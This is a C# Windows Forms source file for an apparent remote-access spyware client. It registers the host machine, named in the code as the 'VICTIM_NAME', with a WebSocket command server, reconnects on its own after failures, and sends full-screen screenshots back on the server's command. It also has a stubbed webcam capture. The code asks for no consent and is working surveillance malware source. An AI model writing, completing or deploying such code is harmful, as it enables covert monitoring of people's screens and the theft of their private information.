using Hiatme_Client.Properties;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net.WebSockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Hiatme_Client
{
    public partial class Form1 : Form
    {
        private ClientWebSocket _ws;
        private CancellationTokenSource _cts;
        private readonly UTF8Encoding _utf8 = new UTF8Encoding(false);

        public Form1()
        {
            InitializeComponent();
            Connect_Setup();
        }

        private async void RequestClientsList()
        {
            await Task.CompletedTask;
        }

        public async void Connect_Setup()
        {
            try
            {
                await Connect_SetupCoreAsync();
            }
            catch (Exception ex)
            {
                try { UpdateStatus("Error: " + (ex.Message ?? ex.ToString())); } catch { }
                try { await Task.Delay(2000); } catch { }
                Connect_Setup();
            }
        }

        private async Task Connect_SetupCoreAsync()
        {
            if (_ws?.State == WebSocketState.Open)
            {
                _cts?.Cancel();
                try { await _ws.CloseAsync(WebSocketCloseStatus.NormalClosure, "", CancellationToken.None); } catch { }
                try { _ws?.Dispose(); } catch { }
            }

            var uri = new Uri(MainValues.ServerWsUrl);
            _ws = new ClientWebSocket();
            _ws.Options.KeepAliveInterval = TimeSpan.FromSeconds(30);
            _cts = new CancellationTokenSource();
            using (var timeoutCts = new CancellationTokenSource(TimeSpan.FromSeconds(15)))
            using (var linked = CancellationTokenSource.CreateLinkedTokenSource(_cts.Token, timeoutCts.Token))
            {
                await _ws.ConnectAsync(uri, linked.Token);
            }

            var pcname = string.IsNullOrEmpty(MainValues.VICTIM_NAME) ? Environment.MachineName : MainValues.VICTIM_NAME;
            var language = $"{RegionInfo.CurrentRegion}/{CultureInfo.CurrentUICulture.TwoLetterISOLanguageName}";
            var model = "Desktop";
            var version = Environment.OSVersion.ToString();
            var id = pcname + "_" + Guid.NewGuid().ToString("N").Substring(0, 8);

            var registerJson = BuildRegisterJson(id, pcname, language, model, version);
            await SendJsonAsync(registerJson);

            try { UpdateStatus("Connected to server."); } catch { }
            _ = ReceiveLoopAsync(_cts.Token);
        }

        private static string BuildRegisterJson(string id, string pcname, string language, string model, string version)
        {
            return "{\"type\":\"register\",\"id\":\"" + EscapeJson(id) + "\",\"pcname\":\"" + EscapeJson(pcname) +
                "\",\"language\":\"" + EscapeJson(language) + "\",\"model\":\"" + EscapeJson(model) +
                "\",\"version\":\"" + EscapeJson(version) + "\"}";
        }

        private static string EscapeJson(string s)
        {
            if (string.IsNullOrEmpty(s)) return "";
            var sb = new StringBuilder(s.Length + 4);
            foreach (var c in s)
            {
                if (c == '\\') sb.Append("\\\\");
                else if (c == '"') sb.Append("\\\"");
                else if (c == '\r') sb.Append("\\r");
                else if (c == '\n') sb.Append("\\n");
                else if (c == '\t') sb.Append("\\t");
                else if (c < ' ')
                    sb.Append("\\u").Append(((int)c).ToString("x4"));
                else
                    sb.Append(c);
            }
            return sb.ToString();
        }

        private void UpdateStatus(string text)
        {
            try
            {
                if (listBox1.IsDisposed) return;
                listBox1.Invoke((MethodInvoker)delegate
                {
                    listBox1.Items.Add("[" + DateTime.Now.ToString("HH:mm:ss") + "] " + text);
                });
            }
            catch { }
        }

        private async Task SendJsonAsync(string json)
        {
            var bytes = _utf8.GetBytes(json);
            await _ws.SendAsync(new ArraySegment<byte>(bytes), WebSocketMessageType.Text, true, _cts.Token);
        }

        private async Task ReceiveLoopAsync(CancellationToken ct)
        {
            var buffer = new byte[4096];
            var sb = new StringBuilder();
            try
            {
                while (_ws != null && _ws.State == WebSocketState.Open && !ct.IsCancellationRequested)
                {
                    var segment = new ArraySegment<byte>(buffer);
                    var result = await _ws.ReceiveAsync(segment, ct);
                    if (result.MessageType == WebSocketMessageType.Close)
                        break;
                    sb.Append(_utf8.GetString(buffer, 0, result.Count));
                    if (!result.EndOfMessage) continue;

                    var message = sb.ToString();
                    sb.Clear();
                    HandleMessage(message);
                }
            }
            catch (OperationCanceledException) { }
            catch (Exception ex)
            {
                try { UpdateStatus("Receive error: " + ex.Message); } catch { }
            }
        }

        private void HandleMessage(string message)
        {
            try
            {
                var type = GetJsonStringValue(message, "type");
                switch (type)
                {
                    case "registered":
                        UpdateStatus("Registered with server.");
                        break;
                    case "requestMedia":
                        HandleRequestMedia(message);
                        break;
                    case "error":
                        UpdateStatus("Server: " + (GetJsonStringValue(message, "message") ?? "error"));
                        break;
                }
            }
            catch (Exception ex)
            {
                UpdateStatus("Parse error: " + ex.Message);
            }
        }

        private static string GetJsonStringValue(string json, string key)
        {
            var keyQuoted = "\"" + key + "\"";
            var start = json.IndexOf(keyQuoted, StringComparison.Ordinal);
            if (start < 0) return null;
            start = json.IndexOf(':', start) + 1;
            var sb = new StringBuilder();
            var inString = false;
            var escape = false;
            for (int i = start; i < json.Length; i++)
            {
                var c = json[i];
                if (escape) { sb.Append(c); escape = false; continue; }
                if (c == '\\' && inString) { escape = true; continue; }
                if (c == '"') { if (inString) return sb.ToString(); inString = true; continue; }
                if (inString) sb.Append(c);
            }
            return null;
        }

        private async void HandleRequestMedia(string msg)
        {
            var requestId = GetJsonStringValue(msg, "requestId");
            var mediaType = GetJsonStringValue(msg, "mediaType") ?? "screenshot";
            if (string.IsNullOrEmpty(requestId)) return;

            try
            {
                string data;
                string mimeType;
                if (mediaType == "camera")
                {
                    var result = CaptureCamera();
                    data = result.base64;
                    mimeType = result.mimeType;
                }
                else
                {
                    var result = CaptureScreen();
                    data = result.base64;
                    mimeType = result.mimeType;
                }
                if (data == null)
                {
                    await SendMediaResponseAsync(requestId, error: mediaType == "camera" ? "Camera capture not available." : "Screen capture failed.");
                    return;
                }
                await SendMediaResponseAsync(requestId, data, mimeType);
            }
            catch (Exception ex)
            {
                await SendMediaResponseAsync(requestId, error: ex.Message);
            }
        }

        /// <summary>Capture from webcam. Currently falls back to screen; add AForge.Video.DirectShow (or similar) for real webcam.</summary>
        private (string base64, string mimeType) CaptureCamera()
        {
            // TODO: Use AForge.Video.DirectShow or other library for real webcam capture on Windows.
            // For now return screen capture so the Tool Suite camera request still gets an image.
            return CaptureScreen();
        }

        private (string base64, string mimeType) CaptureScreen()
        {
            try
            {
                var bounds = SystemInformation.VirtualScreen;
                using (var bmp = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb))
                using (var g = Graphics.FromImage(bmp))
                {
                    g.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy);
                    using (var ms = new MemoryStream())
                    {
                        bmp.Save(ms, ImageFormat.Jpeg);
                        var bytes = ms.ToArray();
                        return (Convert.ToBase64String(bytes), "image/jpeg");
                    }
                }
            }
            catch
            {
                return (null, null);
            }
        }

        private async Task SendMediaResponseAsync(string requestId, string data = null, string mimeType = null, string error = null)
        {
            string json;
            if (error != null)
                json = "{\"type\":\"mediaResponse\",\"requestId\":\"" + EscapeJson(requestId) + "\",\"error\":\"" + EscapeJson(error) + "\"}";
            else
                json = "{\"type\":\"mediaResponse\",\"requestId\":\"" + EscapeJson(requestId) + "\",\"data\":\"" + EscapeJson(data) + "\",\"mimeType\":\"" + EscapeJson(mimeType ?? "image/jpeg") + "\"}";
            await SendJsonAsync(json);
        }

        private async void button1_Click(object sender, EventArgs e)
        {
            RequestClientsList();
        }

        private void button2_Click(object sender, EventArgs e)
        {
        }
    }
}
